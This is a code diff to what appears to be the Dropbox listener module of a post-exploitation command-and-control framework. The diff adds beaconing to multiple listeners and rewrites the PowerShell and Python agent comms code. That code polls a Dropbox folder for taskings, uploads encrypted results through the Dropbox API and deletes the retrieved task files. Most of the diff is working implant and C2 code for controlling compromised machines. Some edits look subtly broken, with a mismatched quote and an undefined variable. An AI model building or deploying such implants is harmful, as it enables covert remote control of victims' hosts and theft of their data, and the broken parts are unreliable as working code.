@@ -124,6 +124,11 @@ class Listener:
                 'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                 'Required'      :   False,
                 'Value'         :   '#general'
+            },
+            'SupListeners': {
+                'Description'   :   'Names of the other Listeners the agent should beacon back to (eg: listener1,listener2,listener3)',
+                'Required'      :   False,
+                'Value'         :   ''
             }
         }
 
@@ -480,6 +485,13 @@ class Listener:
         killDate = listenerOptions['KillDate']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
+        #Should we generate for more than one listener?
+        if self.options['SupListeners']['Value'] != '':
+            listeners = self.options['SupListeners']['Value'].split(',')
+        else:
+            listeners = []
+
+
         if language == 'powershell':
             f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
             code = f.read()
@@ -487,7 +499,18 @@ class Listener:
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            code = code.replace('REPLACE_COMMS', commsCode)
+            code = code.replace('#LISTENER_DICT', commsCode[0])\
+                   .replace('#COMM_FUNCTION', commsCode[1])\
+                   .replace('#TASK_FUNCTION',commsCode[2])
+
+            #iterate through the listeners to retrieve options for each one and generate commCode
+            for l in listeners:
+                loadedlistener = loaded_listeners[active_listeners[l]["moduleName"]]
+                commsCode = loadedlistener.generate_comms(listenerOptions = active_listeners[l]['options'], language=language)
+                code = code.replace('#LISTENER_DICT', commsCode[0])\
+                       .replace('#COMM_FUNCTION', commsCode[1])\
+                       .replace('#TASK_FUNCTION',commsCode[2])
+
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
@@ -509,19 +532,21 @@ class Listener:
             code = f.read()
             f.close()
 
-            #path in the comms methods
+            # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            code = code.replace('REPLACE_COMMS', commsCode)
+            code = code.replace('#LISTENER_DICT', commsCode[0])
+            code = code.replace('#COMM_FUNCTION', commsCode[1])
+
+            #iterate through the listeners to retrieve options for each one and generate commCode
+            for l in listeners:
+                loadedlistener = loaded_listeners[active_listeners[l]["moduleName"]]
+                commsCode = loadedlistener.generate_comms(listenerOptions = active_listeners[l]['options'], language=language)
+
+                code = code.replace('#LISTENER_DICT', commsCode[0])
+                code = code.replace('#COMM_FUNCTION', commsCode[1])
 
             #strip out comments and blank lines
             code = helpers.strip_python_comments(code)
-
-            #patch some more
-            code = code.replace('delay = 60', 'delay = %s' % (delay))
-            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
-            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
-            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
-            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
@@ -534,70 +559,101 @@ class Listener:
             print helpers.color("[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module.")
 
 
-    def generate_comms(self, listenerOptions, language=None):
+    def generate_comms(self, listenerOptions, language=None, **kwargs):
         """
         Generate just the agent communication code block needed for communications with this listener.
 
         This is so agents can easily be dynamically updated for the new listener.
         """
+        
+        #we are generating code for an already deployed agent
+        deployed = "deployed" in kwargs
 
+        delay = listenerOptions["DefaultDelay"]["Value"]
+        jitter = listenerOptions["DefaultJitter"]["Value"]
+        profile = listenerOptions["DefaultProfile"]["Value"]
+        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
         stagingKey = listenerOptions['StagingKey']['Value']
         pollInterval = listenerOptions['PollInterval']['Value']
         apiToken = listenerOptions['APIToken']['Value']
+        b64DefaultResponse = base64.b64encode(self.default_response())
         baseFolder = listenerOptions['BaseFolder']['Value'].strip('/')
         taskingsFolder = "/%s/%s" % (baseFolder, listenerOptions['TaskingsFolder']['Value'].strip('/'))
         resultsFolder = "/%s/%s" % (baseFolder, listenerOptions['ResultsFolder']['Value'].strip('/'))
 
         if language:
             if language.lower() == 'powershell':
-
-                updateServers = """
-    $Script:APIToken = "%s";
-                """ % (apiToken)
+                listener_dict = """
+@{{
+    delay = {delay}
+    name = "{name}"
+    jitter = {jitter}
+    profile= "{profile}"
+    fixed_parameters= @{{
+        headers = @{{UserAgent= "{UA}"}}
+        }}
+    send_func= $script:{send_func}
+    get_task_func= $script:{get_task_func}
+    lostLimit= {lostLimit}
+    missedCheckins={missedCheckins}
+    defaultResponse=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{defaultResponse}"))
+}} 
+#LISTENER_DICT
+""".format(
+           get_task_func = "GetTask{}".format(listenerOptions['Name']['Value']),
+           send_func = "SendMessage{}".format(listenerOptions['Name']['Value']),
+           delay = delay,
+           jitter = jitter,
+           profile = profile,
+           lostLimit = lostLimit,
+           missedCheckins = 0,
+           defaultResponse = b64DefaultResponse,
+           UA = profile.split('|')[1],
+           name = listenerOptions['Name']['Value'])
 
                 getTask = """
-    $script:GetTask = {
-        try {
+    $script:GetTask{name} = {{
+        params($FixedParameters) 
+        $APIToken = "{api_token}";
+        try {{
             # build the web request object
             $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
 
             # set the proxy settings for the WC to be the default system settings
             $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {
+            if($Script:Proxy) {{
                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
-            }
+            }}
 
-            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent", $script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent", $FixedParameters["headers"][User-Agent"])
+            $FixedParameters["headers"].GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
 
-            $TaskingsFolder = "%s"
-            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($Script:APIToken)")
-            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
+            $TaskingsFolder = "{tasking_folder}"
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($APIToken)")
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}}")
             $Data = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData("https://content.dropboxapi.com/2/files/download")
 
-            if($Data -and ($Data.Length -ne 0)) {
+            if($Data -and ($Data.Length -ne 0)) {{
                 # if there was a tasking data, remove it
                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Content-Type", " application/json")
                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Remove("Dropbox-API-Arg")
-                $Null=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
+                $Null=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}}")
                 $Data
-            }
-            $script:MissedCheckins = 0
-        }
-        catch {
-            if ($_ -match 'Unable to connect') {
-                $script:MissedCheckins += 1
-            }
-        }
-    }
-                """ % (taskingsFolder)
+            }}
+        }}
+        catch {{
+        }}
+    }}
+#TASK_FUNC
+                """.format(name = listenerOptions["Name"]["Value"], tasking_folder = taskingsFolder, api_token = apiToken)
 
                 sendMessage = """
-    $script:SendMessage = {
-        param($Packets)
+    $script:SendMessage{name} = {{
+        param($Packets,$FixedParameters)
+        $APIToken = "{api_token}";
 
-        if($Packets) {
+        if($Packets) {{
             # build and encrypt the response packet
             $EncBytes = Encrypt-Bytes $Packets
 
@@ -610,66 +666,72 @@ class Listener:
             # set the proxy settings for the WC to be the default system settings
             $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {
+            if($Script:Proxy) {{
                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
-            }
+            }}
 
-            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
-            $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $FixedParameters["headers"]["User-Agent"])
+            $FixedParameters["headers"].GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
 
-            $ResultsFolder = "%s"
+            $ResultsFolder = {resultsFolder}"
 
-            try {
+            try {{
                 # check if the results file is still in the specified location, if so then
                 #   download the file and append the new routing packet to it
-                try {
+                try {{
                     $Data = $Null
                     $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($Script:APIToken)");
                     $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
                     $Data = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData("https://content.dropboxapi.com/2/files/download")
-                }
-                catch { }
+                }}
+                catch {{ }}
 
-                if($Data -and $Data.Length -ne 0) {
+                if($Data -and $Data.Length -ne 0) {{
                     $RoutingPacket = $Data + $RoutingPacket
-                }
+                }}
 
                 $"""+helpers.generate_random_script_var_name("wc")+"""2 = New-Object System.Net.WebClient
                 $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                 $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                if($Script:Proxy) {
+                if($Script:Proxy) {{
                     $"""+helpers.generate_random_script_var_name("wc")+"""2.Proxy = $Script:Proxy;
-                }
+                }}
 
-                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Authorization", "Bearer $($APIToken)")
                 $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Content-Type", "application/octet-stream")
-                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
+                $"""+helpers.generate_random_script_var_name("wc")+"""2.Headers.Add("Dropbox-API-Arg", "{{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}}");
                 $Null = $"""+helpers.generate_random_script_var_name("wc")+"""2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket)
-                $script:MissedCheckins = 0
-            }
-            catch {
-                if ($_ -match 'Unable to connect') {
-                    $script:MissedCheckins += 1
-                }
-            }
-        }
-    }
-                """ % (resultsFolder)
-                
-                return updateServers + getTask + sendMessage
+            }}
+            catch {{
+            }}
+        }}
+    }}
+#TASK_FUNC
+                """.format(resultsFolder = resultsFolder, name = listenerOptions["Name"]["Value"], api_token = apiToken)
+
+                if deployed:
+                    return ( "$script:NewListenerDict = {};".format(listener_dict) +
+                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']) +
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
+                else:
+                    return (listener_dict,
+                            getTask.format(name = listenerOptions['Name']['Value']),
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             elif language.lower() == 'python':
 
                 sendMessage = """
-def send_message(packets=None):
+def send_message_{name}(packets=None, **kwargs):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
 
+    headers = kwargs['headers']
+
     def post_message(uri, data, headers):
         req = urllib2.Request(uri)
-        headers['Authorization'] = "Bearer REPLACE_API_TOKEN"
+        headers['Authorization'] = "Bearer {api_token}"
         for key, value in headers.iteritems():
             req.add_header("%s"%(key),"%s"%(value))
 
@@ -682,10 +744,8 @@ def send_message(packets=None):
 
         return urllib2.urlopen(req).read()
 
-    global missedCheckins
-    global headers
-    taskingsFolder="REPLACE_TASKSING_FOLDER"
-    resultsFolder="REPLACE_RESULTS_FOLDER"
+    taskingsFolder="{taskings_folder}"
+    resultsFolder="{results_folder}"
     data = None
     requestUri=''
     try:
@@ -701,7 +761,7 @@ def send_message(packets=None):
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
         #check to see if there are any results already present
 
-        headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (resultsFolder, sessionID)
+        headers['Dropbox-API-Arg'] = "{{\\"path\\":\\"%s/%s.txt\\"}}" % (resultsFolder, sessionID)
 
         try:
             pkdata = post_message('https://content.dropboxapi.com/2/files/download', data=None, headers=headers)
@@ -714,7 +774,7 @@ def send_message(packets=None):
         headers['Content-Type'] = "application/octet-stream"
         requestUri = 'https://content.dropboxapi.com/2/files/upload'
     else:
-        headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (taskingsFolder, sessionID)
+        headers['Dropbox-API-Arg'] = "{{\\"path\\":\\"%s/%s.txt\\"}}" % (taskingsFolder, sessionID)
         requestUri='https://content.dropboxapi.com/2/files/download'
 
     try:
@@ -722,7 +782,7 @@ def send_message(packets=None):
         if (resultdata and len(resultdata) > 0) and requestUri.endswith('download'):
             headers['Content-Type'] = "application/json"
             del headers['Dropbox-API-Arg']
-            datastring="{\\"path\\":\\"%s/%s.txt\\"}" % (taskingsFolder, sessionID)
+            datastring="{{\\"path\\":\\"%s/%s.txt\\"}}" % (taskingsFolder, sessionID)
             nothing = post_message('https://api.dropboxapi.com/2/files/delete', datastring, headers)
 
         return ('200', resultdata)
@@ -733,16 +793,38 @@ def send_message(packets=None):
 
     except urllib2.URLError as URLerror:
         # if the server cannot be reached
-        missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
 
     return ('', '')
-"""
+#COMM_FUNC
+""".format(name = listenerOptions["Name"]["Value"],api_token = apiToken, taskings_folder = taskingsFolder, results_folder = resultsFolder)
                 
-                sendMessage = sendMessage.replace('REPLACE_TASKSING_FOLDER', taskingsFolder)
-                sendMessage = sendMessage.replace('REPLACE_RESULTS_FOLDER', resultsFolder)
-                sendMessage = sendMessage.replace('REPLACE_API_TOKEN', apiToken)
-                return sendMessage
+                listener_dict = """
+{{
+    'name': '{name}',
+    'delay' : {delay},
+    'jitter' : {jitter},
+    'fixed_parameters': {{
+        'headers' : {{'User-Agent': "{UA}"}},
+    }},
+    'send_func': {send_func},
+    'defaultResponse': "{defaultResponse}",
+    'lostLimit': {lostLimit},
+    'missedCheckins':0,
+}},
+#LISTENER_DICT
+"""
+
+                return( listener_dict.format(
+                            send_func = "send_message_{}".format(listenerOptions['Name']['Value']),
+                            delay = delay,
+                            jitter = jitter,
+                            UA = profile.split('|')[1],
+                            name = listenerOptions['Name']['Value'],
+                            lostLimit = lostLimit,
+                            defaultResponse = b64DefaultResponse),
+                        sendMessage)
+
         else:
             print helpers.color('[!] listeners/dbx generate_comms(): no language specified!')
 
